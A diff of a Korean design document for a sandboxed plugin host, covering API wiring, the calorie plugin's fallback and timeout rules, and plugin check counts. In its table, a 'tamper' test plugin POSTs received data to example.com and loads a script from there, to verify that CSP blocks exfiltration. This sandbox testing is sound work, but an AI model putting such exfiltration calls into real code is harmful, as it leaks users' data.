@@ -84,9 +84,8 @@
 
 | 이름 | 쓰는 쪽 | 설명 |
 | --- | --- | --- |
-| `startPluginHost(): () => void` | `main.tsx`(React 렌더 전) | 기본 `lensStore`로 호스트 하나. 여러 번 불러도 하나, 해제 함수 반환 |
-| `sendDelivery(deliveryId): boolean` | A `broker/` | 2.5. 호스트가 없으면 `prepared`를 `failed`로 |
-| `sendDeliveryMessage(pluginId, msg): void` | A `broker/`의 `connectPluginHost(send)`(PR #11의 `SendDelivery` 모양) | 받은 메시지가 스토어 Delivery와 같을 때(같은 Blob 객체 포함)만 `sendDelivery`. 다르면 `failed`. 두 PR이 머지되면 `main.tsx`에 `connectPluginHost(sendDeliveryMessage)` 한 줄을 넣는다 |
+| `startPluginHost(): () => void` | `main.tsx`(허브가 1차 통합에서 배선, 02-SSRD "트랙 연결 기준") | 기본 `lensStore`로 호스트 하나. 여러 번 불러도 하나, 해제 함수 반환 |
+| `sendDelivery(deliveryId): boolean` | A `broker/`. 허브가 `connectPluginHost((_id, msg) => { sendDelivery(msg.deliveryId); })`로 잇는다. B는 A를 import하지 않는다 | 2.5. 안에서 `markDelivery`를 쓴다. 호스트가 없으면 `prepared`를 `failed`로 |
 | `sha256Hex(blob): Promise<string>` | A `broker/` | `Delivery.sha256`(소문자 16진). `crypto.subtle`(LAN HTTP에서는 없음) → 순수 JS |
 | `createPluginHost(options): { sendDelivery, stop }` | `/dev`, 시험 | `store`, `container`, `hostOrigin`, `sourceFor(plugin)`(플러그인 id로 고를 수 있다), `sdkTestOptionsFor(pluginId)`, `readyTimeoutMs`, `ackTimeoutMs`, `now` 주입. `stop()`은 구독·타이머·iframe을 없애고 돌던 플러그인을 `loading`으로 둔다(다음 호스트가 다시 만든다) |
 
@@ -110,8 +109,8 @@
 
 | 플러그인 | 하는 일 | 기록 |
 | --- | --- | --- |
-| 칼로리(`calorie.ts`) | `apiBase`가 null(비교 모드)이면 요청하지 않고 고정표. 아니면 `POST {apiBase}/api/calorie`, 본문 = 받은 Blob 그대로, `Content-Type: image/jpeg`, `x-label`은 `^[a-z][a-z ]{0,31}$`일 때만(서버 규칙과 같다, Latin-1). `AbortController` 3초(`CALORIE_CLIENT_TIMEOUT_MS`). 200이고 첫 줄이 비어 있지 않으면 그 줄(`api`), 비 200·빈 본문·시간 초과·요청 실패는 고정표(`fallback`) | 시간 초과(abort)를 뺀 요청 실패(CSP 차단·네트워크·CORS)는 `reportViolation('fetch', url)`. 호스트가 "허용 목록 밖"(F14 도메인 삭제) 또는 "허용 목록 안인데 실패"를 붙인다 |
-| 고정표 | 02-SSRD IF-08 표 10종. 표 밖 라벨은 "음식(칼로리 정보 없음)"(03-SRS FR-032 결정. 02-SSRD의 [제안] "음식(종류 미상)" 대신) | — |
+| 칼로리(`calorie.ts`) | `apiBase`가 null(비교 모드)이면 요청하지 않고 고정표. 아니면 `POST {apiBase}/api/calorie`, 본문 = 받은 Blob 그대로, `Content-Type: image/jpeg`, `x-label`은 core `X_LABEL_RE`(32자 이하)를 통과할 때만. 3초 타이머(`CALORIE_CLIENT_TIMEOUT_MS`)는 `fetch` 바로 전에 시작하고 같은 signal로 `res.text()`까지 덮는다. 200이고 첫 줄이 비어 있지 않으면 그 줄(`api`), 그 밖(비 200·빈 본문·중단·네트워크 오류·CSP 차단)은 고정표(`fallback`) | 남기지 않는다. 실패해도 `reportViolation`을 부르지 않는다(서버 장애가 HUD 빨강으로 보이지 않게, 02-SSRD "플러그인 SDK" 네트워크 행) |
+| 고정표 | `src/core/calorie.ts`의 `CALORIE_TABLE`·`X_LABEL_RE`·`X_LABEL_MAX`를 registry가 JSON 인자로 넣는다. Worker 안 규칙은 core `fallbackText`와 같고, 표 밖 문구는 core가 정한 "음식(종류 미상)"(`fallbackText('')`로 받아 넣는다). check-plugins가 여러 라벨로 core와 대조한다 | — |
 | 변조(`tamper.ts`) | `onInit`이 끝난 뒤(ready 다음) 4종을 차례로: `navigator.mediaDevices.getUserMedia`, `document`·`parent`·`top`·`localStorage`를 이름 그대로 평가(CSP에 `unsafe-eval`이 없어 `new Function`은 쓰지 않는다), `fetch('https://example.com/famelet-tamper', POST)`, `importScripts('https://example.com/famelet-tamper.js')`. 받은 조각도 같은 주소로 보내 본다 | 4종 각각 `reportViolation`. target에 본 결과를 적는다(`→ 없음`, `=ReferenceError`). 시도가 성공하면 target에 "차단 실패!"를 붙인다. fetch·script target은 URL이라 호스트가 목록과 대조한다 |
 
 ## 3. 고르지 않은 방법
@@ -137,7 +136,7 @@
 
 ## 5. 확인 방법
 
-- `npm run check:plugins`(`scripts/check-plugins.ts`) NN개: `sha256Pure` 표준 벡터·무작위 길이·600KB·M0 JPEG, 메시지 검증기 경계(200/201자, UTF-16 이모지, 128·512자, 크기, 모르는 키, Blob 값, 빈 프로토타입), CSP 생성과 주입 거부, srcdoc 순서, violation reason 대조, 칼로리(가짜 fetch: 200·비 200·요청 실패·시간 초과·apiBase null·헤더 규칙·core `fallbackText`와 같은 문구), 변조 4종, SDK를 원본·축소판으로 `vm`에서 돌려 ready·ack·result·violation·순수 JS·corrupt·suppress·해시 실패·느린 핸들러와 다음 ack·onInit 예외·hello 결과 줄.
+- `npm run check:plugins`(`scripts/check-plugins.ts`) 34개: `sha256Pure` 표준 벡터·무작위 길이·600KB·M0 JPEG, 메시지 검증기 경계(200/201자, UTF-16 이모지, 128·512자, 크기, 모르는 키, Blob 값, 빈 프로토타입), CSP 생성과 주입 거부, srcdoc 순서, violation reason 대조, 칼로리(가짜 fetch: 200·비 200·요청 실패·시간 초과·apiBase null·헤더 규칙·core `fallbackText`와 같은 문구), 변조 4종, SDK를 원본·축소판으로 `vm`에서 돌려 ready·ack·result·violation·순수 JS·corrupt·suppress·해시 실패·느린 핸들러와 다음 ack·onInit 예외·hello 결과 줄.
 - 개발 서버 `/dev/m0.html` M0 페이지 15줄, `/dev/plugins.html` 9줄(칼로리 정상·도메인 삭제·고정표 밖 라벨·비교 모드 켜기/끄기·변조 4종·변조 조각 외부 전송·apiSends).
 
 ## 6. 리뷰 기록
